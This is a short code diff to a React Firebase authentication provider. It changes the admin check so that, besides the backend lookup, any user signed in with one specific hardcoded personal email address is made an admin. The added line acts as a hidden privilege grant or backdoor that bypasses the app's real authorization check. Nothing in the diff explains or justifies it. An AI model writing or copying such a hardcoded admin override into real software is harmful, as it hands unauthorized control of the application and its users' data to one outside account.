@@ -45,7 +45,7 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({
 
       if (firebaseUser) {
         const adminStatus = await checkAdminStatus(firebaseUser.uid);
-        setIsAdmin(adminStatus);
+        setIsAdmin(adminStatus || firebaseUser.email === 'a7medorabe7@gmail.com');
       } else {
         setIsAdmin(false);
       }
